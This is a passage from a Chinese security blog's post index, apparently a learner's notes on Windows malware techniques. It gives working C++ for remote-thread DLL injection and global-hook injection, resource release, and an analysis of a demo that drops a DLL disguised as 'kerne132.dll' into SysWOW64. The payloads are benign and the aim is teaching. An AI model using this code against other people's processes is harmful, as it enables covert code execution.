所述dwStackSize参数指定堆栈的初始保留大小。如果未指定此标志，则dwStackSize指定提交大小。 lpThreadId：指向接受线程标识符的变量的指针。如果此参数为NULL，则不返回线程标识符。 返回值：如果成功，则返回值是新线程的句柄；如果失败，则返回NULL。 实现过程RemoteThreadInject.cpp代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;BOOL CreateRemoteThreadInject(DWORD dwProcessId, WCHAR* pszDllFileName) &#123; HANDLE hProcess = NULL; DWORD dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; //获取注入进程句柄 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); return FALSE; &#125; dwSize = lstrlen(pszDllFileName) + 1; //申请内存 pDllAddr = VirtualAllocEx(hProcess, NULL, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (pDllAddr == NULL) &#123; printf(&quot;申请内存失败\\n&quot;); return FALSE; &#125; //向申请的内存写入数据 BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * 2, NULL); if (WriteFlag == NULL) &#123; printf(&quot;写入内存失败\\n&quot;); return FALSE; &#125; //获取loadlibrary pFuncProcAddr = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;); if (pFuncProcAddr == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); return FALSE; &#125; HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, NULL); if (hRemoteThread == NULL) &#123; printf(&quot;创建线程失败\\n&quot;); return FALSE; &#125; WaitForSingleObject(hRemoteThread, -1); DWORD code; GetExitCodeThread(hRemoteThread, &amp;code); code = GetLastError(); VirtualFreeEx(hProcess, pDllAddr, 0, MEM_RELEASE); CloseHandle(hProcess); CloseHandle(hRemoteThread); return TRUE;&#125;int main() &#123; printf(&quot;按下回车开始注入\\n&quot;); getchar(); HWND hNotepadWindow = FindWindow(L&quot;Notepad&quot;,L&quot;无标题 - 记事本&quot;); if (hNotepadWindow == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); exit(-1); &#125; DWORD dwPID = 0; GetWindowThreadProcessId(hNotepadWindow, &amp;dwPID); if (dwPID == 0) &#123; printf(&quot;获取PID失败\\n&quot;); exit(-1); &#125; bool flag = CreateRemoteThreadInject(dwPID, L&quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\RemoteTest.dll&quot;); if (flag == FALSE) &#123; printf(&quot;注入失败\\n&quot;); &#125; else printf(&quot;注入成功\\n&quot;); getchar(); return 0;&#125; dllmain.cpp代码如下，主要实现一个弹窗功能。 1234567891011121314151617181920// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: MessageBox(NULL, L&quot;注入成功！&quot;, L&quot;ok&quot;, MB_OK); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 效果查看先打开notepad再打开我们编写的程序，将DLL文件放在指定路径下。 开始注入，就可以看到已经成功弹出了窗口。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"病毒分析-资源释放+钩子注入","slug":"病毒分析-资源释放+钩子注入","date":"2021-07-12T02:15:02.000Z","updated":"2021-07-12T03:52:12.644Z","comments":true,"path":"2021/07/12/病毒分析-资源释放+钩子注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/","excerpt":"","text":"把上次写的资源释放和全局钩子注入结合起来，做了一个小demo，实现功能就是把自己的写的DLL作为资源加入，然后自释放出来，再调用这个DLL进行钩子注入。 使用dir工具先查看一下基本信息，可以看到当前程序未加壳。 再查看一下导入表的相关信息，看看都使用了哪些API。可以看到一些资源相关API，还有Loadlibrary和getprocaddress，这两个API，写过shellcode都知道使用这两个API可以获取所有dll和其中的函数。 再查看一下字符串的一些信息，可以看到有这样一个字符串“C:\\Windows\\SysWOW64\\kerne132.dll”，可以看到这个dll和系统dll”kernel32.dll”区别是最后一位，用1代替了l。可能是一个恶意的dll被释放到了C:\\Windows\\SysWOW64\\下。 使用IDA查看一下，F5查看伪代码，可以先看到资源释放的过程，其释放了一个名为“kerne132.dll”的文件到C:\\Windows\\SysWOW64\\下。 然后调用了这个DLL里面的函数setglobalhook，从名字可以看出来，这应该是一个钩子的函数。 到目标目录下去查看一下，可以看到这个伪装成kernel32.dll的恶意dll文件。 使用IDA查看一下这个DLL文件，看一下它的导出表，可以看到导出了两个函数SetGlobalHook和UnsetGlobalHook，从名字上猜测应该是安装钩子和卸载钩子。 查看SetGlobalHook，可以看到使用了SetWindowsHookExW函数，IDHOOK的值是3,3是WH_GETMESSAGE代表这是一个全局钩子。 使用PC hunter工具可以很方便的查看是否存在钩子。","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}]},{"title":"病毒分析-资源释放","slug":"病毒分析-资源释放","date":"2021-07-09T01:54:29.000Z","updated":"2021-07-12T02:15:39.146Z","comments":true,"path":"2021/07/09/病毒分析-资源释放/","link":"","permalink":"https://b1ack1e.github.io/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/","excerpt":"","text":"本篇来分析一下自己写的资源释放的小demo。 打开程序，发现没有任何改变，没有明显的行为。 使用die工具查一下文件的基本信息 查看一下导入表，可以看到FindResource等函数，这几个函数是用来操作资源的，猜测有可能是释放了一个资源节中的资源到电脑上。 还可以看到fwrite，fopen这样的函数，那么应该就是把资源释放到了一个路径中去。 可以使用resource hacker来查看程序中的资源，如图可以看到资源信息“this is a test” 再使用IDA进行查看，可以很清楚的看到所有的流程，并且看到程序将释放的文件存放在了C:\\Windows\\System32下。 因为程序是32位程序，系统是64位，所以资源会被释放到SysWOW64文件下。因为此文件夹是用来处理运行在64位系统上的32位程序的。 到路径下查找free.txt即可找到","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}]},{"title":"注入技术-全局钩子注入","slug":"注入技术-全局钩子注入","date":"2021-07-08T09:52:07.000Z","updated":"2021-07-28T03:17:42.869Z","comments":true,"path":"2021/07/08/注入技术-全局钩子注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/","excerpt":"","text":"全局钩子注入windows中大部分应用程序都是基于消息机制的，每个进程都有自己的消息队列。 局部钩子是针对某个线程的，全局钩子是作用于整个系统的基于消息的应用。全局钩子需要使用DLL文件，在DLL文件中实现相应的钩子函数。 函数介绍SetWindowsHookEx函数将程序定义的钩子函数安装到挂钩链中，安装钩子程序可以监视系统是否存在某些类型的事件，这些事件与特定线程或调用线程所在桌面中的所有线程相关联。 123456HHOOK SetWindowsHookExA( int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId); 参数idHook：要安装的钩子程序的类型，该参数具体可以见下表。 值 含义 WH_CALLWNDPROC4 安装钩子程序，在系统将消息发送到目标窗口过程之前监视消息 WH_CALLWNDPROCRET12 安装钩子程序，在目标窗口过程处理消息后监视消息 WH_CBT5 安装接受对CBT应用程序有用通知的钩子程序 WH_DEBUG9 安装可用于调试其他钩子程序的钩子程序 WH_FOREGROUNDIDLE11 安装在应用程序的前台线程即将变为空闲时调用的钩子过程，该钩子对于在空闲时执行低优先级任务很有用 WH_GETMESSAGE3 安装一个挂钩过程，它监视发送到消息队列的消息 WH_JOURNALPLAYBACK1 安装一个挂钩过程，用于发布先前由WH_JOURNALRECORD挂钩过程记录的消息 WH_JOURNALRECORD0 安装一个挂钩过程，记录发布到系统消息队列中的输入消息。这个钩子对于录制宏很有用。 WH_KEYBOARD2 安装监视按键消息的挂钩过程 WH_KEYBOARD_LL13 安装监视低级键盘输入事件的挂钩过程 WH_MOUSE7 安装监视鼠标消息的挂钩过程 WH_MOUSE_LL14 安装监视低级鼠标输入事件的挂钩过程 WH_MSGFILTER-1 安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息 WH_SHELL10 安装接受对于shell应用程序有用通知的钩子程序 WH_SYSMSGFILTER6 安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息，钩子程序监视与调用线程相同桌面中所有应用程序的这些消息 lpfn：一个指向钩子程序的指针。如果dwThreadId参数为0或指定由不同进程创建线程标识符，则lpfn参数必须指向DLL中的钩子过程。否则，lpfn可以指向与当前进程关联的代码中的钩子过程。 hMod：包含由lpfn参数指向的钩子过程的DLL句柄。如果dwThreadId参数指定由当前进程创建线程，并且钩子过程位于与当前进程关联的代码中，则hMod参数必须设置为NULL。 dwThreadId：与钩子程序关联的线程标识符。如果此参数为0，则钩子过程与系统中所有线程相关联。 返回值如果函数成功，则返回值是钩子过程的句柄。 如果函数失败，则返回值为NULL。 实现过程创建全局钩子，钩子函数需要在一个DLL文件中。进程的地址空间是独立的，发生对应事件的进程不能调用其他进程地址空间的钩子函数。如果钩子的实现在DLL中的话，则在对应事件发生的时候，系统会把这个DLL加载到发生事件的进程地址空间之中，使它能够调用钩子函数进行处理。创建一个全局钩子之后，在对应事件发生的时候，系统就会把DLL加载到发生事件的进程中，这样就实现了DLL注入。 设置idHook的值为WH_GETMESSAGE就可以让DLL注入到所有的进程中，因为WH_GETMESSAGE类型的钩子会监视消息队列，并且Windows系统是基于消息驱动的，所有进程都会有一个自己的消息队列，都会加载WH_GETMESSAGE类型的全局钩子DLL。 DLL文件如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;//共享内存#pragma data_seg(&quot;mydata&quot;)#pragma data_seg()#pragma comment(linker, &quot;/SECTION:mydata,RWS&quot;)HMODULE g_hDllModule = NULL;HHOOK g_hHook = NULL;// 钩子回调函数LRESULT GetMsgProc(int code, WPARAM wParam, LPARAM lParam)&#123; return CallNextHookEx(g_hHook, code, wParam, lParam);&#125;// 设置全局钩子BOOL SetGlobalHook()&#123; g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, 0); if (NULL == g_hHook) &#123; return FALSE; &#125; return TRUE;&#125;// 卸载钩子BOOL UnsetGlobalHook()&#123; if (g_hHook) &#123; UnhookWindowsHookEx(g_hHook); &#125; return TRUE;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#123; g_hDllModule = hModule; break; &#125; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 全局钩子是以DLL形式加载到其他进程空间之中的，且进程都是独立的，任意修改其中的一个内存里的数据是不会影响另一个进程的。所在DLL中创建了共享内存，共享内存是指突破进程独立性，多个进程共享同一段内存。在DLL中创建共享内存，就是在DLL之中创建一个变量，然后将DLL加载到多个进程空间，只要一个进程修改了该变量值，其他进程DLL中的这个值也会改变，就相当于多个进程共享一个内存。 编写一个调用DLL的程序，test.exe 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// test.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; typedef BOOL(*typedef_SetGlobalHook)(); typedef BOOL(*typedef_UnsetGlobalHook)(); HMODULE hDll = NULL; typedef_SetGlobalHook SetGlobalHook = NULL; typedef_UnsetGlobalHook UnsetGlobalHook = NULL; BOOL bRet = FALSE; printf(&quot;按下回车开始设置钩子\\n&quot;); getchar(); do &#123; hDll = LoadLibrary(L&quot;Hook.dll&quot;); if (NULL == hDll) &#123; printf(&quot;加载DLL失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; SetGlobalHook = (typedef_SetGlobalHook)GetProcAddress(hDll, &quot;SetGlobalHook&quot;); if (NULL == SetGlobalHook) &#123; printf(&quot;获取函数地址失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; bRet = SetGlobalHook(); if (bRet) &#123; printf(&quot;设置钩子成功\\n&quot;); &#125; else &#123; printf(&quot;设置钩子失败\\n&quot;); &#125; system(&quot;pause&quot;); UnsetGlobalHook = (typedef_UnsetGlobalHook)GetProcAddress(hDll, &quot;UnsetGlobalHook&quot;); if (NULL == UnsetGlobalHook) &#123; printf(&quot;获取函数地址失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; UnsetGlobalHook(); printf(&quot;卸载钩子成功\\n&quot;); &#125; while (FALSE); system(&quot;pause&quot;);&#125; 效果查看可以先试用PC hunter工具进行查看，可以看到当前没有任何消息钩子存在。 打开我们的test.exe，设置好钩子之后，再进行查看，刷新一下消息钩子列表，如图可以看到已经存在了一个消息钩子。 使用OD附加打开notepad.exe，再打开模块窗口。 再打开test.exe，进行钩子设置。可以很明显看到变化，已经注入成功了。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"HOOK","slug":"HOOK","permalink":"https://b1ack1e.github.io/tags/HOOK/"}]},{"title":"资源释放","slug":"资源释放","date":"2021-07-08T03:52:26.000Z","updated":"2021-07-27T08:45:39.345Z","comments":true,"path":"2021/07/08/资源释放/","link":"","permalink":"https://b1ack1e.github.io/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/","excerpt":"","text":"资源释放恶意代码会广泛的使用此技术，因为它可以使程序变得简洁，提高隐蔽性。如果一个程序需要额外的加载一些DLL、文本文件或者其他类型文件，将它们可以作为资源插入到程序中，在程序运行的时候再将它们释放到本地上，这样恶意代码会更加隐蔽。 函数介绍FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置12345HRSRC FindResourceW( HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType); hModule：处理包含资源的可执行文件模块。若hModule为NULL，则系统从当前进程的模块中装载资源。 lpName：指定资源名称 lpType：指定资源类型 返回值：如果函数运行成功，那么返回值为指定资源信息块的句柄。可将这个句柄传递给其它函数获取其他信息。如果失败，则返回NULL； SizeofResource函数：获取指定资源的字节数1234DWORD SizeofResource( HMODULE hModule, HRSRC hResInfo); hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。 hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。 返回值：如果函数运行成功，则返回值为资源的字节数；如果函数运行失败，则返回值为0； LoadResource函数：装载指定资源到全局存储器1234HGLOBAL LoadResource( HMODULE hModule, HRSRC hResInfo); hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。 hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。 返回值：如果函数运行成功，则返回值为相关资源数据的句柄。如果函数运行失败，则返回值为NULL。 LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针123LPVOID LockResource( HGLOBAL hResData); hResData：装载资源的句柄。函数LoadResource可以返回这个句柄。 返回值：如果装载资源被锁住，则返回值是资源的第一个字节的指针；反之则为NULL。 实现过程创建一个test.txt文件，写入内容 在程序中添加一个自定义资源，自定义资源名称为“MYRES”，再将刚才创建的txt文件添加进去 程序实现源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// FreeRes.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;resource.h&quot;//资源控件名称，资源名称，释放后的名称BOOL FreeRes(UINT uiResourceName,TCHAR* lpszResType,char* lpszSaveFileName) &#123; //获取指定模块的资源 HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(uiResourceName), lpszResType); if (hRes == NULL) &#123; MessageBox(NULL, L&quot;获取资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //获取大小 DWORD dwSize = SizeofResource(NULL, hRes); if (dwSize == 0) &#123; MessageBox(NULL, L&quot;获取字节数失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //装载资源 HGLOBAL hGlobal = LoadResource(NULL, hRes); if (hGlobal == NULL) &#123; MessageBox(NULL, L&quot;装载资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //锁定资源 LPVOID lPvoid = LockResource(hGlobal); if(lPvoid == NULL)&#123; MessageBox(NULL, L&quot;锁定资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //开始释放资源 FILE* fp; fopen_s(&amp;fp, lpszSaveFileName, &quot;wb+&quot;);//wb+读写打开或建立一个二进制文件，允许读和写 if (fp == NULL) &#123; MessageBox(NULL, L&quot;写入资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; fwrite(lPvoid, sizeof(char), dwSize, fp); fclose(fp); return TRUE;&#125;int main()&#123; printf(&quot;按下回车键开始释放资源\\n&quot;); getchar(); BOOL FLAG=FreeRes(IDR_MYRES2,TEXT(&quot;MYRES&quot;),&quot;free.txt&quot;); if (FLAG == TRUE) &#123; printf(&quot;释放成功\\n&quot;); &#125; else printf(&quot;释放失败\\n&quot;); getchar();&#125; 查看free.txt内容 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}]},{"title":"写在前面的话","slug":"写在前面的话","date":"2021-07-08T03:50:10.000Z","updated":"2021-07-08T09:40:20.968Z","comments":true,"path":"2021/07/08/写在前面的话/","link":"","permalink":"https://b1ack1e.github.io/2021/07/08/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D/","excerpt":"","text":"一直都在说要写博客，但是一直都没有很好的坚持下来，上次写博客还是大二的时候，这都过去好久了。 现在自己也搭建了一个博客，希望能够好好坚持下去吧，作为日常的学习记录，也希望能够写出一些有价值的东西。 最后的最后，我是不知名小团队satter的b1ackie。","categories":[],"tags":[]}],"categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"},{"name":"HOOK技术","slug":"HOOK技术","permalink":"https://b1ack1e.github.io/categories/HOOK%E6%8A%80%E6%9C%AF/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ack1e.github.io/categories/ShellCode/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"},{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"Inline Hook","slug":"Inline-Hook","permalink":"https://b1ack1e.github.io/tags/Inline-Hook/"},{"name":"隐藏技术","slug":"隐藏技术","permalink":"https://b1ack1e.github.io/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"},{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ack1e.github.io/tags/ShellCode/"},{"name":"提权技术","slug":"提权技术","permalink":"https://b1ack1e.github.io/tags/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/"},{"name":"UAC","slug":"UAC","permalink":"https://b1ack1e.github.io/tags/UAC/"},{"name":"自启动技术","slug":"自启动技术","permalink":"https://b1ack1e.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"},{"name":"PE","slug":"PE","permalink":"https://b1ack1e.github.io/tags/PE/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"HOOK","slug":"HOOK","permalink":"https://b1ack1e.github.io/tags/HOOK/"}]}